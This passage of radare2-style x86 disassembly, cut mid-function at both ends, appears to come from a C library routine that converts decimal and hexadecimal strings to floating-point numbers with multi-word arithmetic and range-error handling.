cmovle eax, ebx
add dword [var_184h], eax
mov ebx, edx
sub ebx, eax
mov eax, dword [var_184h]
mov dword [var_15ch], ebx
add eax, ebx
cmp eax, 0x135
jg 0x8088854
cmp ebx, 0xfffffebd
jl 0x80897fe
mov ecx, dword [var_184h]
test ecx, ecx
jle 0x8088a15
mov esi, dword [var_18ch]
mov edx, dword [var_190h]
lea eax, [var_15ch]
mov ecx, dword [var_198h]
mov dword [var_10h], eax
mov eax, dword [var_174h]
mov dword [var_14h], esi
mov dword [var_1ch], edx
mov esi, dword [var_184h]
mov dword [var_18h], ecx
lea edx, [var_160h]
mov dword [esp], eax
lea ecx, [var_ach]
mov dword [var_ch], edx
mov dword [var_8h], ecx
mov dword [var_4h], esi
call fcn.08087f00
mov ebx, dword [var_15ch]
mov dword [var_174h], eax
test ebx, ebx
jle 0x8088829
lea edx, [var_ach]
lea ecx, [var_14ch]
mov edi, 1
mov dword [var_1b4h], edx
mov dword [var_1b8h], ecx
mov dword [var_1bch], 0x80a7020
test edi, ebx
je 0x8088806
mov eax, dword [var_1bch]
mov edx, dword [var_160h]
xor ebx, edi
mov dword [var_15ch], ebx
mov esi, dword [eax + 4]
sub esi, 2
cmp edx, esi
jl 0x80897cf
mov dword [var_10h], esi
mov eax, dword [eax]
mov dword [var_8h], edx
mov edx, dword [var_1b8h]
lea eax, [eax*4 + 0x80a6248]
mov dword [var_ch], eax
mov dword [esp], edx
mov eax, dword [var_1b4h]
mov dword [var_4h], eax
call fcn.0808c7c0
mov edx, eax
mov eax, dword [var_160h]
add eax, esi
test edx, edx
mov dword [var_160h], eax
jne 0x80887e8
dec eax
mov dword [var_160h], eax
mov eax, dword [var_1b4h]
mov esi, dword [var_1b8h]
mov ebx, dword [var_15ch]
mov dword [var_1b4h], esi
mov dword [var_1b8h], eax
add edi, edi
add dword [var_1bch], 0x10
test ebx, ebx
jne 0x8088776
lea eax, [var_14ch]
cmp dword [var_1b4h], eax
je 0x80897b3
mov edx, dword [var_160h]
bsr ecx, dword [ebp + edx*4 - 0xb0]
xor ecx, 0x1f
mov eax, edx
mov dword [var_1c0h], edx
shl eax, 5
sub eax, ecx
cmp eax, 0x400
mov dword [var_170h], eax
jle 0x8088864
call fcn.08048b20
mov dword [eax], 0x22
jmp 0x80883df
cmp dword [var_170h], 0x35
jle 0x80889d9
mov edx, dword [var_170h]
mov eax, dword [var_170h]
mov dword [var_1c8h], 0x1f
sub edx, 0x16
sub eax, 0x35
mov esi, eax
mov edi, eax
cmovs esi, edx
sar esi, 5
mov edx, esi
lea ecx, [esi - 1]
shl edx, 5
sub edi, edx
cmovne ecx, esi
lea eax, [edi - 1]
test edi, edi
cmove eax, dword [var_1c8h]
mov dword [var_1c4h], ecx
mov dword [var_1c8h], eax
jne 0x8088958
mov eax, dword [ebp + esi*4 - 0xac]
mov dword [var_158h], eax
mov eax, dword [ebp + esi*4 - 0xa8]
mov dword [var_154h], eax
mov eax, dword [var_ach]
xor ebx, ebx
test eax, eax
jne 0x80888f4
inc ebx
mov eax, dword [ebp + ebx*4 - 0xac]
test eax, eax
je 0x80888e8
xor eax, eax
mov esi, dword [var_180h]
cmp dword [var_184h], esi
jl 0x808890c
cmp ebx, dword [var_1c4h]
jge 0x8088911
mov eax, 1
mov dword [var_14h], eax
mov edx, dword [var_1c4h]
mov ecx, dword [var_164h]
mov eax, dword [var_1c8h]
mov dword [var_8h], ecx
mov dword [var_10h], eax
mov eax, dword [ebp + edx*4 - 0xac]
mov dword [var_ch], eax
mov eax, dword [var_170h]
dec eax
lea esi, [var_158h]
mov dword [var_4h], eax
mov dword [esp], esi
call fcn.08087c40
jmp 0x80882b6
mov eax, dword [var_1c0h]
mov ebx, esi
dec eax
cmp esi, eax
jge 0x80889be
mov dword [var_1cch], eax
mov dword [var_1d0h], 0x20
lea eax, [var_158h]
sub dword [var_1d0h], edi
mov dword [var_218h], eax
mov edx, dword [ebp + ebx*4 - 0xac]
mov ecx, edi
mov eax, dword [ebp + ebx*4 - 0xa8]
inc ebx
shr edx, cl
movzx ecx, byte [var_1d0h]
shl eax, cl
or edx, eax
mov eax, dword [var_218h]
mov dword [eax], edx
add eax, 4
cmp ebx, dword [var_1cch]
mov dword [var_218h], eax
jl 0x8088987
mov eax, ebx
sub eax, esi
dec eax
jg 0x80888dc
mov eax, dword [ebp + ebx*4 - 0xac]
mov ecx, edi
shr eax, cl
jmp 0x80888d6
mov eax, dword [var_184h]
cmp dword [var_180h], eax
je 0x8089640
mov ecx, dword [var_1c0h]
lea esi, [var_ach]
lea edi, [var_158h]
cld
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov eax, dword [var_160h]
cmp eax, 1
jle 0x8089630
mov esi, 0x37
lea edx, [var_14ch]
lea ecx, [var_ach]
sub esi, dword [var_170h]
mov dword [var_1e0h], edx
mov dword [var_1e4h], ecx
mov edx, 0x55555556
mov ecx, dword [var_180h]
mov dword [var_1e8h], 0x80a7020
sub ecx, dword [var_184h]
mov dword [var_1dch], 0
mov eax, esi
imul edx
mov eax, esi
sar eax, 0x1f
sub edx, eax
lea eax, [edx + 2]
cmp ecx, eax
jle 0x8088a89
mov ecx, dword [var_184h]
mov dword [var_1dch], 1
lea edx, [edx + ecx + 2]
mov dword [var_180h], edx
mov esi, dword [var_180h]
mov dword [var_16ch], 0
sub esi, dword [var_184h]
sub esi, ebx
mov ebx, 1
mov dword [var_1d8h], esi
test dword [var_1d8h], ebx
je 0x8088af4
mov eax, dword [var_16ch]
xor dword [var_1d8h], ebx
test eax, eax
jne 0x80895b4
mov eax, dword [var_1e8h]
mov edi, dword [var_1e0h]
cld
mov edx, dword [eax + 4]
mov esi, dword [eax]
sub edx, 2
lea esi, [esi*4 + 0x80a6248]
mov ecx, edx
mov dword [var_16ch], edx
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov eax, dword [var_1d8h]
add ebx, ebx
add dword [var_1e8h], 0x10
test eax, eax
jne 0x8088aac
lea eax, [var_ach]
cmp dword [var_1e0h], eax
je 0x8089598
mov edx, dword [var_190h]
mov esi, dword [var_18ch]
lea eax, [var_15ch]
mov ecx, dword [var_198h]
mov dword [var_10h], eax
mov dword [var_1ch], edx
mov dword [var_14h], esi
lea edx, [var_160h]
mov esi, dword [var_184h]
mov dword [var_ch], edx
mov dword [var_18h], ecx
sub dword [var_180h], esi
mov edx, dword [var_174h]
lea ecx, [var_ach]
mov eax, dword [var_180h]
mov dword [var_8h], ecx
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.08087f00
mov ecx, dword [var_16ch]
bsr eax, dword [ebp + ecx*4 - 0x150]
mov ebx, eax
xor ebx, 0x1f
jle 0x8088be2
lea esi, [var_14ch]
mov dword [var_8h], ecx
mov dword [var_ch], ebx
mov dword [var_4h], esi
mov dword [esp], esi
call fcn.0808c6f0
mov eax, dword [var_160h]
lea edx, [var_ach]
mov dword [var_ch], ebx
mov dword [var_4h], edx
mov dword [esp], edx
mov dword [var_8h], eax
call fcn.0808c6f0
test eax, eax
mov edx, eax
je 0x8088be2
mov eax, dword [var_160h]
mov dword [ebp + eax*4 - 0xac], edx
inc eax
mov dword [var_160h], eax
cmp dword [var_16ch], 1
mov esi, dword [var_170h]
mov dword [var_15ch], esi
je 0x8089440
cmp dword [var_16ch], 2
je 0x8089139
mov eax, dword [var_16ch]
mov ecx, dword [var_16ch]
mov dword [var_200h], 0
xor edi, edi
mov edx, dword [ebp + eax*4 - 0x154]
mov esi, dword [ebp + eax*4 - 0x150]
mov eax, dword [var_160h]
mov dword [var_1fch], edx
sub ecx, eax
mov dword [var_8h], eax
lea eax, [ebp + ecx*4 - 0x14c]
mov dword [var_4h], eax
lea eax, [var_ach]
mov dword [esp], eax
call fcn.0808c330
test eax, eax
jle 0x8088c75
mov eax, dword [var_160h]
mov dword [ebp + eax*4 - 0xac], 0
inc eax
mov dword [var_160h], eax
mov eax, dword [var_160h]
cmp eax, dword [var_16ch]
jge 0x8089117
mov edx, dword [var_16ch]
sub edx, eax
mov dword [var_204h], edx
mov edx, dword [var_170h]
test edx, edx
jle 0x80890c0
mov eax, dword [var_204h]
shl eax, 5
add eax, dword [var_170h]
cmp eax, 0x35
jg 0x8088ff7
mov ecx, dword [var_160h]
mov eax, dword [var_158h]
mov dword [var_158h], 0
test ecx, ecx
mov dword [var_154h], eax
jle 0x8088cf7
mov eax, dword [var_204h]
lea edx, [eax + ecx]
mov eax, dword [ebp + ecx*4 - 0xb0]
dec ecx
test ecx, ecx
mov dword [ebp + edx*4 - 0xac], eax
jg 0x8088cdb
mov edx, dword [var_204h]
xor eax, eax
inc edx
cmp eax, edx
jge 0x8088d14
mov dword [ebp + eax*4 - 0xac], 0
inc eax
cmp eax, edx
jl 0x8088d04
shl dword [var_204h], 5
mov edx, dword [var_204h]
add dword [var_170h], edx
mov eax, dword [var_16ch]
cmp dword [var_170h], 0x35
mov dword [ebp + eax*4 - 0x14c], 0
mov edx, eax
mov eax, dword [ebp + eax*4 - 0xac]
mov ebx, eax
jg 0x8088ebf
lea ecx, [edx + 1]
lea eax, [edx - 1]
mov dword [var_210h], ecx
mov dword [var_20ch], eax
cmp ebx, esi
mov edi, 0xffffffff
je 0x8088dc0
mov edx, dword [var_16ch]
mov eax, dword [ebp + edx*4 - 0xb0]
mov edx, ebx
div esi
mov ecx, edx
mov edi, eax
mov eax, dword [var_1fch]
mul edi
cmp edx, ecx
mov ebx, eax
jbe 0x8088fd9
add ecx, esi
dec edi
cmp ecx, esi
jb 0x8088dc0
cmp ebx, dword [var_1fch]
lea eax, [edx - 1]
cmovb edx, eax
sub ebx, dword [var_1fch]
cmp edx, ecx
ja 0x8088d92
jne 0x8088dc0
mov eax, dword [var_16ch]
cmp ebx, dword [ebp + eax*4 - 0xb4]
ja 0x8088d92
mov edx, dword [var_210h]
lea ecx, [var_14ch]
lea eax, [var_ach]
mov dword [var_ch], edi
mov dword [var_4h], ecx
mov dword [esp], eax
mov dword [var_8h], edx
call fcn.0808d600
mov edx, dword [var_16ch]
cmp dword [ebp + edx*4 - 0xac], eax
je 0x8088e16
lea eax, [var_ach]
lea ecx, [var_14ch]
mov dword [var_ch], edx
mov dword [var_8h], ecx
mov dword [var_4h], eax
mov dword [esp], eax
dec edi
call fcn.0808c2a0
mov ecx, dword [var_16ch]
mov edx, dword [var_20ch]
mov eax, dword [ebp + ecx*4 - 0xb0]
test edx, edx
mov dword [ebp + ecx*4 - 0xac], eax
mov ebx, eax
jle 0x8088e49
mov eax, dword [ebp + edx*4 - 0xb0]
mov dword [ebp + edx*4 - 0xac], eax
dec edx
test edx, edx
jg 0x8088e36
mov eax, dword [var_170h]
test eax, eax
jne 0x8088f4c
test edi, edi
mov edx, 0x20
je 0x8088e66
bsr edx, edi
xor edx, 0x1f
mov ecx, 0x20
sub dword [var_15ch], edx
mov eax, ecx
sub eax, edx
cmp eax, 0x35
jle 0x8088f2c
add edx, 0x35
mov eax, edi
mov dword [var_214h], 0x56
sub ecx, edx
mov dword [var_200h], edx
shr eax, cl
mov dword [var_158h], eax
mov ecx, dword [var_214h]
cmp ecx, 0x35
mov dword [var_170h], ecx
jle 0x8088d62
mov esi, dword [var_16ch]
mov eax, dword [ebp + esi*4 - 0xac]
test eax, eax
mov edx, dword [var_16ch]
jne 0x8088edd
test edx, edx
js 0x8088edd
dec edx
mov ebx, dword [ebp + edx*4 - 0xac]
test ebx, ebx
jne 0x8088edd
test edx, edx
jns 0x8088ecd
mov ecx, dword [var_1dch]
xor eax, eax
test ecx, ecx
jne 0x8088eed
test edx, edx
js 0x8088ef2
mov eax, 1
mov dword [var_14h], eax
lea edx, [var_158h]
mov dword [var_ch], edi
mov eax, 0x1f
mov dword [esp], edx
sub eax, dword [var_200h]
mov dword [var_10h], eax
mov eax, dword [var_164h]
mov dword [var_8h], eax
mov eax, dword [var_15ch]
dec eax
mov dword [var_4h], eax
jmp 0x808894e
neg edx
mov dword [var_154h], 0
mov dword [var_158h], edi
add edx, 0x20
mov dword [var_214h], edx
jmp 0x8088e9d
mov eax, dword [var_170h]
add eax, 0x20
cmp eax, 0x35
mov dword [var_214h], eax
jg 0x8088f77
mov eax, dword [var_158h]
mov dword [var_158h], edi
mov dword [var_154h], eax
jmp 0x8088e9d
mov dword [var_200h], 0x35
mov edx, dword [var_170h]
sub dword [var_200h], edx
mov eax, dword [var_200h]
test eax, eax
jle 0x8088e9d
mov ecx, dword [var_200h]
lea eax, [var_158h]
mov dword [var_8h], 2
mov dword [var_4h], eax
mov dword [esp], eax
mov dword [var_ch], ecx
call fcn.0808c6f0
mov eax, edi
mov ecx, 0x20
sub ecx, dword [var_200h]
shr eax, cl
or dword [var_158h], eax
jmp 0x8088e9d
jne 0x8088dc0
mov eax, dword [var_16ch]
cmp ebx, dword [ebp + eax*4 - 0xb4]
ja 0x8088d92
jmp 0x8088dc0
mov dword [var_200h], 0x35
mov edx, dword [var_170h]
sub dword [var_200h], edx
cmp dword [var_200h], 0x1f
jle 0x8089083
mov ebx, dword [var_200h]
mov ecx, dword [var_200h]
mov dword [var_8h], 2
add ebx, 0x1f
cmp dword [var_200h], 0xffffffff
cmovg ebx, dword [var_200h]
sar ebx, 5
mov eax, ebx
shl eax, 5
sub ecx, eax
lea eax, [var_158h]
mov dword [var_4h], eax
mov dword [var_ch], ecx
lea eax, [ebp + ebx*4 - 0x158]
mov dword [esp], eax
call fcn.0808c6f0
mov eax, ebx
dec eax
js 0x8088d14
lea edx, [ebp + eax*4 - 0x158]
mov dword [edx], 0
sub edx, 4
dec eax
jns 0x8089072
jmp 0x8088d14
mov eax, dword [var_200h]
test eax, eax
jle 0x8088d14
mov edx, dword [var_200h]
lea ecx, [var_158h]
mov dword [var_8h], 2
mov dword [var_4h], ecx
mov dword [esp], ecx
mov dword [var_ch], edx
call fcn.0808c6f0
jmp 0x8088d14
lea esi, [esi]
test eax, eax
mov ecx, eax
jle 0x80890e2
mov eax, dword [var_204h]
lea edx, [eax + ecx]
mov eax, dword [ebp + ecx*4 - 0xb0]
dec ecx
test ecx, ecx
mov dword [ebp + edx*4 - 0xac], eax
jg 0x80890c6
mov edx, dword [var_204h]
xor eax, eax
inc edx
cmp eax, edx
jge 0x80890ff
mov dword [ebp + eax*4 - 0xac], 0
inc eax
cmp eax, edx
jl 0x80890ef
shl dword [var_204h], 5
mov edx, dword [var_204h]
sub dword [var_15ch], edx
jmp 0x8088d27
test eax, eax
mov edx, eax
jle 0x8088d27
mov eax, dword [ebp + edx*4 - 0xb0]
mov dword [ebp + edx*4 - 0xac], eax
dec edx
test edx, edx
jg 0x8089121
jmp 0x8088d27
cmp dword [var_160h], 1
mov eax, dword [var_148h]
mov dword [var_1f4h], 0
mov dword [var_1f8h], 0
mov edi, dword [var_14ch]
mov dword [var_1f0h], eax
jle 0x8089389
mov esi, dword [var_a8h]
mov ebx, dword [var_ach]
cmp dword [var_170h], 0x35
jg 0x808924d
cmp esi, dword [var_1f0h]
je 0x8089355
mov eax, ebx
mov edx, esi
div dword [var_1f0h]
mov ecx, edx
mov dword [var_1f4h], eax
mul edi
mov esi, edx
mov ebx, eax
cmp esi, ecx
ja 0x80891b3
jne 0x80891cc
test ebx, ebx
je 0x80891cc
add ecx, dword [var_1f0h]
dec dword [var_1f4h]
sub ebx, edi
sbb esi, 0
cmp ecx, dword [var_1f0h]
jae 0x80891a9
xor eax, eax
sub eax, ebx
sbb ecx, esi
mov esi, ecx
mov ebx, eax
mov eax, dword [var_170h]
test eax, eax
jne 0x80892be
mov eax, dword [var_1f4h]
mov edx, 0x20
test eax, eax
je 0x80891fd
bsr edx, dword [var_1f4h]
xor edx, 0x1f
mov ecx, 0x20
sub dword [var_15ch], edx
mov eax, ecx
sub eax, edx
cmp eax, 0x35
jle 0x8089298
mov eax, dword [ebp - 0x1f4]
add edx, 0x35
mov dword [ebp - 0x214], 0x56
sub ecx, edx
mov dword [ebp - 0x1f8], edx
shr eax, cl
mov dword [ebp - 0x158], eax
mov eax, dword [ebp - 0x214]
cmp eax, 0x35
mov dword [ebp - 0x170], eax
jle 0x8089185
mov ecx, dword [var_1dch]
xor eax, eax
test ecx, ecx
jne 0x8089261
test esi, esi
jne 0x8089261
test ebx, ebx
je 0x8089266
mov eax, 1
mov dword [var_14h], eax
mov edx, dword [var_1f4h]
mov eax, 0x1f
sub eax, dword [var_1f8h]
mov dword [var_ch], edx
mov dword [var_10h], eax
mov ecx, dword [var_164h]
mov eax, dword [var_15ch]
mov dword [var_8h], ecx
jmp 0x8088940
mov ecx, dword [ebp - 0x1f4]
neg edx
mov dword [ebp - 0x154], 0
add edx, 0x20
mov dword [ebp - 0x214], edx
mov dword [ebp - 0x158], ecx
jmp 0x8089238
mov eax, dword [var_170h]
add eax, 0x20
cmp eax, 0x35
mov dword [var_214h], eax
jg 0x80892ef
mov eax, dword [var_158h]
mov edx, dword [var_1f4h]
mov dword [var_154h], eax
mov dword [var_158h], edx
jmp 0x8089238
mov dword [var_1f8h], 0x35
mov ecx, dword [var_170h]
sub dword [var_1f8h], ecx
mov eax, dword [var_1f8h]
test eax, eax
jle 0x8089238
mov eax, dword [ebp - 0x1f8]
lea edx, [ebp - 0x158]
mov dword [esp + 8], 2
mov dword [esp + 4], edx
mov dword [esp], edx
mov dword [esp + 0xc], eax
call fcn.0808c6f0
mov eax, dword [ebp - 0x1f4]
mov ecx, 0x20
sub ecx, dword [ebp - 0x1f8]
shr eax, cl
or dword [ebp - 0x158], eax
jmp 0x8089238
lea ecx, [esi + ebx]
mov dword [var_1f4h], 0xffffffff
cmp ecx, esi
jb 0x8089379
test edi, edi
mov esi, edi
lea eax, [edi - 1]
mov ebx, edi
cmovne esi, eax
neg ebx
jmp 0x80891a9
sub ecx, edi
xor ebx, ebx
mov esi, ecx
add ebx, edi
adc esi, 0
jmp 0x80891d6
mov eax, dword [var_ach]
cmp eax, dword [var_1f0h]
jb 0x80893a0
xor esi, esi
mov ebx, eax
jmp 0x8089178
mov ecx, dword [var_170h]
test ecx, ecx
jle 0x8089429
mov ebx, dword [var_170h]
add ebx, 0x20
cmp ebx, 0x35
jg 0x80893e3
mov eax, dword [var_158h]
mov dword [var_158h], 0
mov dword [var_154h], eax
mov eax, dword [var_ach]
mov dword [var_170h], ebx
mov esi, eax
xor ebx, ebx
jmp 0x8089178
mov dword [var_1f8h], 0x35
mov edx, dword [var_170h]
sub dword [var_1f8h], edx
mov edx, dword [var_1f8h]
test edx, edx
jle 0x80893d4
mov ecx, dword [var_1f8h]
lea esi, [var_158h]
mov dword [var_8h], 2
mov dword [var_4h], esi
mov dword [esp], esi
mov dword [var_ch], ecx
call fcn.0808c6f0
jmp 0x80893ce
mov ebx, dword [var_170h]
sub ebx, 0x20
mov dword [var_15ch], ebx
jmp 0x80893da
lea esi, [esi]
mov dword [var_1ech], 0
mov ebx, dword [var_ach]
mov edi, dword [var_14ch]
xor eax, eax
mov edx, ebx
div edi
mov esi, eax
mov ebx, edx
mov eax, dword [var_170h]
test eax, eax
jne 0x808950b
test esi, esi
mov edx, 0x20
je 0x808947d
bsr edx, esi
xor edx, 0x1f
mov ecx, 0x20
sub dword [var_15ch], edx
mov eax, ecx
sub eax, edx
cmp eax, 0x35
jle 0x80894ee
add edx, 0x35
mov eax, esi
mov dword [var_214h], 0x56
sub ecx, edx
mov dword [var_1ech], edx
shr eax, cl
mov dword [var_158h], eax
mov edx, dword [var_214h]
cmp edx, 0x35
mov dword [var_170h], edx
jle 0x8089456
mov edi, dword [var_1dch]
xor eax, eax
test edi, edi
jne 0x80894d1
test ebx, ebx
je 0x80894d6
mov eax, 1
mov dword [var_14h], eax
mov dword [var_ch], esi
mov eax, 0x1f
sub eax, dword [var_1ech]
jmp 0x808927f
neg edx
mov dword [var_154h], 0
mov dword [var_158h], esi
add edx, 0x20
mov dword [var_214h], edx
jmp 0x80894b0
mov ecx, dword [var_170h]
add ecx, 0x20
cmp ecx, 0x35
mov dword [var_214h], ecx
jg 0x8089536
mov eax, dword [var_158h]
mov dword [var_158h], esi
mov dword [var_154h], eax
jmp 0x80894b0
mov dword [var_1ech], 0x35
mov eax, dword [var_170h]
sub dword [var_1ech], eax
mov eax, dword [var_1ech]
test eax, eax
jle 0x80894b0
mov edx, dword [var_1ech]
lea ecx, [var_158h]
mov dword [var_8h], 2
mov dword [var_4h], ecx
mov dword [esp], ecx
mov dword [var_ch], edx
call fcn.0808c6f0
mov eax, esi
mov ecx, 0x20
sub ecx, dword [var_1ech]
shr eax, cl
or dword [var_158h], eax
jmp 0x80894b0
mov ecx, dword [var_16ch]
lea edi, [var_14ch]
mov esi, eax
cld
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
jmp 0x8088b19
mov edx, dword [var_1e8h]
mov ecx, dword [var_16ch]
mov esi, dword [var_1e0h]
mov dword [var_10h], ecx
mov ecx, dword [var_1e4h]
mov dword [var_ch], esi
mov eax, dword [edx + 4]
sub eax, 2
mov dword [var_8h], eax
mov eax, dword [edx]
mov dword [esp], ecx
lea eax, [eax*4 + 0x80a6248]
mov dword [var_4h], eax
call fcn.0808c7c0
mov edi, dword [var_1e0h]
mov esi, dword [var_1e8h]
mov edx, dword [var_16ch]
add edx, dword [esi + 4]
mov esi, dword [var_1e4h]
mov dword [var_1e4h], edi
mov dword [var_1e0h], esi
lea ecx, [edx - 2]
sub edx, 3
test eax, eax
cmovne edx, ecx
mov dword [var_16ch], edx
jmp 0x8088af4
mov dword [ebp + eax*4 - 0x158], 0
jmp 0x8088a15
mov eax, dword [var_170h]
mov edx, dword [var_170h]
add eax, 0x1e
dec edx
cmovns eax, edx
mov dword [var_1d4h], edx
and eax, 0xffffffe0
sub edx, eax
cmp edx, 0x14
je 0x8089765
cmp edx, 0x13
jg 0x80896ff
mov ecx, dword [var_1c0h]
mov eax, 0x14
mov ebx, 2
sub eax, edx
lea esi, [var_ach]
mov dword [var_ch], eax
mov dword [var_4h], esi
mov eax, ebx
sub eax, ecx
mov dword [var_8h], ecx
lea eax, [ebp + eax*4 - 0x158]
mov dword [esp], eax
call fcn.0808c6f0
mov eax, ebx
sub eax, dword [var_160h]
test eax, eax
jle 0x80896c5
lea edx, [var_158h]
mov dword [edx], 0
add edx, 4
dec eax
jne 0x80896b9
mov ecx, dword [var_164h]
mov esi, dword [var_1d4h]
mov dword [var_14h], 0
mov dword [var_10h], 0
mov dword [var_ch], 0
mov dword [var_8h], ecx
mov dword [var_4h], esi
lea eax, [var_158h]
mov dword [esp], eax
jmp 0x808894e
lea eax, [edx - 0x14]
lea edi, [var_158h]
lea edx, [var_ach]
mov dword [var_ch], eax
mov dword [var_4h], edx
mov eax, dword [var_1c0h]
mov dword [var_8h], eax
mov eax, 2
sub eax, dword [var_1c0h]
lea eax, [edi + eax*4]
mov dword [esp], eax
call fcn.0808c750
mov edx, 1
sub edx, dword [var_160h]
test edx, edx
mov dword [ebp + edx*4 - 0x158], eax
jle 0x80896c5
mov ecx, edi
mov eax, edx
mov dword [ecx], 0
add ecx, 4
dec eax
jne 0x8089754
jmp 0x80896c5
mov eax, 2
mov ecx, dword [var_1c0h]
lea esi, [var_ach]
mov edi, eax
sub edi, dword [var_1c0h]
cld
shl ecx, 2
shr ecx, 2
lea edi, [ebp + edi*4 - 0x158]
rep movsd dword es:[edi], dword ptr [esi]
sub eax, dword [var_160h]
test eax, eax
jle 0x80896c5
lea edx, [var_158h]
mov dword [edx], 0
add edx, 4
dec eax
jne 0x80897a2
jmp 0x80896c5
mov ecx, dword [var_160h]
lea edi, [var_ach]
mov esi, eax
cld
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
jmp 0x8088829
mov dword [var_10h], edx
mov ecx, dword [var_1b4h]
mov dword [var_8h], esi
mov edx, dword [var_1bch]
mov dword [var_ch], ecx
mov ecx, dword [var_1b8h]
mov eax, dword [edx]
mov dword [esp], ecx
lea eax, [eax*4 + 0x80a6248]
jmp 0x80887c4
call fcn.08048b20
mov dword [eax], 0x22
jmp 0x8088385
mov ecx, dword [var_184h]
mov eax, ebx
neg ecx
cmp ebx, ecx
jge 0x80886aa
mov eax, ecx
jmp 0x80886aa
mov eax, dword [var_174h]
mov ecx, dword [arg_14h]
mov dword [var_1b0h], 1
mov esi, 0x14
movzx edx, byte [eax]
mov edi, dword [ecx + 0x34]
movsx eax, dl
test byte [edi + eax*2 + 1], 0x10
jne 0x8089868
inc dword [var_174h]
mov eax, dword [var_174h]
movzx edx, byte [eax]
movsx eax, dl
test byte [edi + eax*2 + 1], 0x10
je 0x808984f
cmp dl, 0x30
je 0x8089a26
movsx edx, dl
lea eax, [edx - 0x30]
cmp eax, 9
ja 0x8089a0f
inc dword [var_174h]
mov edx, eax
mov eax, dword [edx*4 + 0x80a6160]
dec dword [var_180h]
mov dword [var_170h], eax
mov eax, esi
sub eax, dword [var_170h]
lea ecx, [eax + 1]
mov esi, eax
shl edx, cl
mov ecx, dword [var_170h]
mov dword [var_154h], edx
mov edx, dword [var_184h]
lea eax, [ecx + edx*4]
add eax, dword [var_15ch]
lea ebx, [eax - 5]
mov eax, dword [var_180h]
mov dword [var_15ch], ebx
test eax, eax
jle 0x808994c
mov eax, dword [var_1b0h]
lea ebx, [ebp + eax*4 - 0x158]
mov ecx, dword [var_174h]
movzx edx, byte [ecx]
movsx eax, dl
test byte [edi + eax*2 + 1], 0x10
jne 0x8089909
mov eax, dword [var_198h]
add ecx, eax
mov dword [var_174h], ecx
movzx edx, byte [ecx]
movsx edx, dl
lea eax, [edx - 0x30]
cmp eax, 9
ja 0x80899f8
inc dword [var_174h]
mov edx, eax
lea eax, [esi + 1]
cmp eax, 3
jle 0x808999f
lea ecx, [esi - 3]
sub esi, 4
shl edx, cl
or dword [ebx], edx
dec dword [var_180h]
mov eax, dword [var_180h]
test eax, eax
jle 0x808994c
mov eax, dword [var_1b0h]
test eax, eax
jns 0x80898e5
mov ebx, dword [var_1b0h]
test ebx, ebx
jle 0x808996e
lea edx, [var_158h]
mov eax, dword [var_1b0h]
mov dword [edx], 0
add edx, 4
dec eax
jne 0x8089962
mov esi, dword [var_164h]
mov eax, dword [var_15ch]
mov dword [var_14h], 0
mov dword [var_10h], 0
mov dword [var_ch], 0
mov dword [var_8h], esi
mov dword [var_4h], eax
jmp 0x80896f1
mov ecx, 3
mov eax, edx
sub ebx, 4
sub ecx, esi
shr eax, cl
lea ecx, [esi + 0x1d]
or dword [ebx + 4], eax
shl edx, cl
dec dword [var_1b0h]
js 0x80899c7
mov dword [ebx], edx
add esi, 0x1c
jmp 0x8089932
xor eax, eax
mov ecx, dword [var_164h]
mov dword [var_10h], 0x1f
cmp dword [var_180h], 0
mov dword [var_ch], edx
setg al
mov dword [var_8h], ecx
mov dword [var_14h], eax
mov eax, dword [var_15ch]
jmp 0x8088941
mov ecx, dword [arg_14h]
inc dword [var_174h]
mov eax, dword [ecx + 0x38]
mov edx, dword [eax + edx*4]
sub edx, 0x57
jmp 0x8089920
mov ecx, dword [arg_14h]
inc dword [var_174h]
mov eax, dword [ecx + 0x38]
mov edx, dword [eax + edx*4]
sub edx, 0x57
jmp 0x8089888
inc dword [var_174h]
mov ecx, dword [var_174h]
movzx edx, byte [ecx]
cmp dl, 0x30
je 0x8089a26
jmp 0x8089871
mov eax, dword [var_188h]
mov edx, dword [var_15ch]
shl eax, 2
sub edx, eax
jmp 0x808866a
test al, al
jne 0x8088602
jmp 0x808863f
mov ecx, dword [var_18ch]
movzx eax, byte [ecx + 1]
jmp 0x8089a55
mov edx, dword [arg_ch]
test edx, edx
jne 0x8088380
jmp 0x8088385
mov ecx, dword [arg_ch]
test ecx, ecx
je 0x8088385
mov eax, dword [arg_8h]
mov esi, dword [arg_ch]
mov dword [esi], eax
jmp 0x8088385
mov eax, dword [var_18ch]
movzx eax, byte [eax]
mov byte [var_206h], al
mov edx, dword [var_180h]
xor eax, eax
test edx, edx
mov dword [var_184h], edx
setne al
xor ebx, ebx
dec eax
cmp byte [var_206h], 0
mov dword [var_188h], eax
je 0x8089e22
mov ecx, dword [var_18ch]
movzx eax, byte [ecx]
cmp al, byte [ebx + edi]
jne 0x8089aeb
mov edx, dword [var_18ch]
inc ebx
movzx eax, byte [ebx + edx]
test al, al
jne 0x8089ad7
test al, al
jne 0x8089e1b
add edi, dword [var_198h]
movzx esi, byte [edi]
lea eax, [esi - 0x30]
cmp al, 9
ja 0x8089ddd
mov eax, dword [arg_14h]
mov ecx, dword [eax + 0x38]
mov edx, esi
cmp dl, 0x30
je 0x8089b34
mov eax, dword [var_180h]
sub eax, dword [var_184h]
cmp dword [var_188h], 0xffffffff
cmovne eax, dword [var_188h]
mov dword [var_188h], eax
inc dword [var_180h]
inc edi
movzx esi, byte [edi]
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x8089b0d
cmp dword [var_168h], 0x10
mov edx, esi
movsx eax, dl
jne 0x8089b60
mov edx, dword [ecx + eax*4]
cmp edx, 0x60
jle 0x8089b60
cmp edx, 0x66
jle 0x8089b0d
cmp dword [var_168h], 0x10
mov dword [var_17ch], edi
je 0x8089dd4
cmp dword [ecx + eax*4], 0x65
je 0x8089c61
mov esi, dword [var_184h]
cmp dword [var_180h], esi
jle 0x8089b9b
mov eax, dword [var_17ch]
cmp byte [eax - 1], 0x30
je 0x8089c44
mov ecx, dword [var_184h]
cmp dword [var_180h], ecx
jne 0x808859b
mov ebx, dword [var_180h]
test ebx, ebx
jle 0x808859b
mov ebx, dword [var_15ch]
test ebx, ebx
jns 0x808859b
cmp dword [var_168h], 0x10
je 0x8089c28
mov eax, dword [var_17ch]
movzx ecx, byte [eax - 1]
movsx eax, cl
sub eax, 0x30
